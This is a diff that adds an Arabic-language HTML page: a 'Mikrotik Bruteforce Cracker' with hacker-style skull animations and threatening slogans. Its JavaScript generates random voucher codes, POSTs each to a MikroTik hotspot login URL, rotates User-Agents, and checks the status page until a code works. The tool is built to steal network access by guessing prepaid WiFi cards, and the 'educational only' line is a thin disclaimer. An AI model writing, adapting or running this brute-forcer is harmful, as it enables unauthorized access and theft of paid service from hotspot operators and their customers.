@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>Eng - H  O  S  S  A  M - Card Cracker</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: "Courier New", monospace;
+      margin: 0;
+      padding: 20px;
+      overflow: hidden;
+    }
+    .toolsbox {
+      max-width: 800px;
+      margin: auto;
+      background: #111;
+      padding: 20px;
+      border-radius: 15px;
+      border: 2px solid #0f0;
+      position: relative;
+      z-index: 2;
+    }
+    input, textarea, button, progress {
+      width: 100%;
+      background: #000;
+      color: #0f0;
+      border: 1px solid #0f0;
+      margin: 5px 0;
+      padding: 10px;
+      font-size: 14px;
+    }
+    button:hover {
+      background: #0f0;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    h1 {
+      text-align: center;
+      font-size: 24px;
+      color: red;
+      text-shadow: 0 0 5px #0f0;
+    }
+    pre.face {
+      color: red;
+      font-weight: bold;
+      text-align: center;
+      font-size: 14px;
+    }
+    .links {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .links a {
+      color: #0ff;
+      text-decoration: none;
+      display: block;
+      margin: 5px 0;
+    }
+    .warning {
+      color: #f00;
+      text-align: center;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    /* تأثير مرعب */
+    .skulls {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+    .skull {
+      position: absolute;
+      color: red;
+      font-size: 20px;
+      animation: fall 5s linear infinite;
+    }
+    @keyframes fall {
+      0% { top: -5%; opacity: 1; }
+      100% { top: 100%; opacity: 0; }
+    }
+  </style>
+</head>
+<body onload="showCompletion();createSkulls();">
+  <div class="toolsbox">
+    <h1>Eng - H  O  S  S  A  M - Mikrotik Cracker</h1>
+    <pre class="face">
+▄︻デ══一    تم تطوير الأداة بواسطة MrPYTHON - أبوقريش الصنعاني    
+▄︻デ══一    [Mikrotik Bruteforce Cracker]    
+☠︎  لا مهرب... لا مفر... أنت التالي  ☠︎
+⚠️  الحكومه كيان... ونحن الكيان الحقيقي ⚠️
+    </pre>
+
+    <div class="warning">تحذير: هذه الأداة لأغراض التعليم فقط. استخدامك لها هو مسؤوليتك الشخصية!</div>
+
+    <input id="loginURL" placeholder="رابط login (مثال: http://m.net/login)">
+    <input id="loginChars" placeholder="أحرف الكرت (مثال: 0123456789ABCDEF)">
+    <input id="loginUsernameFixed" placeholder="بادئة ثابتة (اختياري)">
+    <input type="number" id="loginUsernameLength" placeholder="طول الكرت">
+    <input type="number" id="loginCount" placeholder="عدد المحاولات">
+    <input type="number" id="loginTimeOut" placeholder="المدة بين المحاولات (مللي ثانية)">
+    <textarea id="proxyList" placeholder="قائمة البروكسيات (اختياري)" rows="2"></textarea>
+    <textarea id="uaList" placeholder="قائمة User-Agent (اختياري)" rows="2"></textarea>
+    
+    <button id="startBtn">ابدأ التخمين</button>
+    <button onclick="stopProgram()">إيقاف</button>
+    <progress id="prog" max="100"></progress>
+    <input id="status" readonly placeholder="الحالة">
+
+    <iframe id="loginPageViewer" style="width:100%; height:300px; margin-top:10px; border:1px solid #0f0;"></iframe>
+
+    <div class="links">
+      <a href="https://t.me/SECET1NET" target="_blank">قناتي على تليجرام</a>
+      <a href="https://mrpython3.arrd.co/" target="_blank">جميع حساباتي</a>
+    </div>
+  </div>
+
+  <div class="skulls" id="skullContainer"></div>
+
+  <script>
+    let counter=0, maxCnt=0, stopFlag=false, interval;
+    const parseList = id => document.getElementById(id).value.split(/\r?\n/).filter(l=>l.trim());
+    const getRnd = arr => arr[Math.floor(Math.random()*arr.length)];
+    const randStr = (len,chars,fixed) => {
+      let s = fixed||"";
+      for(let i=0;i<len-(fixed?.length||0);i++) s+=chars.charAt(Math.floor(Math.random()*chars.length));
+      return s;
+    };
+
+    async function attempt(code){
+      const url=document.getElementById('loginURL').value;
+      const statusUrl = url.replace("/login", "/status");
+      const proxies=parseList('proxyList'), uas=parseList('uaList');
+      const headers={'Content-Type':'application/x-www-form-urlencoded'};
+      if(uas.length) headers['User-Agent']=getRnd(uas);
+
+      document.getElementById('loginPageViewer').src = `${url}?username=${encodeURIComponent(code)}`;
+      document.getElementById('status').value = `تجربة: ${code}`;
+
+      try{
+        await fetch(url, {
+          method:'POST',
+          headers,
+          body:`username=${encodeURIComponent(code)}`,
+          redirect:'manual'
+        });
+
+        const res = await fetch(statusUrl, {
+          method: 'GET',
+          headers,
+          redirect: 'manual'
+        });
+
+        const txt = await res.text();
+        if (res.status === 200 && txt.includes("status") || txt.includes("connected") || txt.length > 100) {
+          stopFlag = true;
+          document.getElementById('status').value = `تم تسجيل الدخول بنجاح بالكرت: ${code}`;
+          alert("✔✔ تم تسجيل الدخول ✔✔\nالكرت الصحيح هو: " + code);
+          clearInterval(interval);
+        }
+
+      } catch(e){}
+    }
+
+    function runProgram(){
+      stopFlag=false; counter=0;
+      const chars=document.getElementById('loginChars').value;
+      const fixed=document.getElementById('loginUsernameFixed').value;
+      maxCnt=parseInt(document.getElementById('loginCount').value);
+      const len=parseInt(document.getElementById('loginUsernameLength').value);
+      document.getElementById('prog').value=0;
+
+      interval=setInterval(async()=>{
+        if(stopFlag||counter>=maxCnt){clearInterval(interval);return;}
+        const code=randStr(len,chars,fixed);
+        await attempt(code);
+        counter++;
+        document.getElementById('prog').value = Math.floor(counter/maxCnt*100);
+      },parseInt(document.getElementById('loginTimeOut').value));
+    }
+
+    function stopProgram(){ stopFlag=true; clearInterval(interval); }
+    function showCompletion(){ document.getElementById('status').value='جاهز للعمل... أدخل البيانات وانطلق!'; }
+
+    document.getElementById("startBtn").addEventListener("click", function(e) {
+      e.preventDefault();
+      if (!stopFlag) {
+        runProgram();
+      }
+    });
+
+    function createSkulls() {
+      const skulls = ['☠','✖','⚠','⛧','𓂀','𓆩𓆪'];
+      const skullContainer = document.getElementById('skullContainer');
+      setInterval(() => {
+        const skull = document.createElement('div');
+        skull.className = 'skull';
+        skull.innerText = getRnd(skulls);
+        skull.style.left = Math.random() * 100 + 'vw';
+        skull.style.fontSize = (Math.random() * 20 + 10) + 'px';
+        skull.style.animationDuration = (Math.random() * 3 + 3) + 's';
+        skullContainer.appendChild(skull);
+        setTimeout(() => skull.remove(), 5000);
+      }, 200);
+    }
+  </script>
+</body>
+</html>
